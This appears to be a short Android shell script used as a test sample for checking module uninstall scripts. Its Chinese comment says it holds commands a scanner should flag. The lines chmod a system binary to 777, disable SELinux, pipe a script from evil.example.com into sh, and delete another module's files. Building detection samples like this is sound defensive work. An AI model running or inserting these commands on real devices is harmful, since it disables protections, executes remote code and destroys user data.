#!/system/bin/sh
# 卸载脚本里的升级项必须被压掉：这里放三条「升级表会中招」的命令
chmod 777 /system/bin/evil
setenforce 0
curl -s http://evil.example.com/uninstall.sh | sh
rm -rf /data/adb/modules/other_module
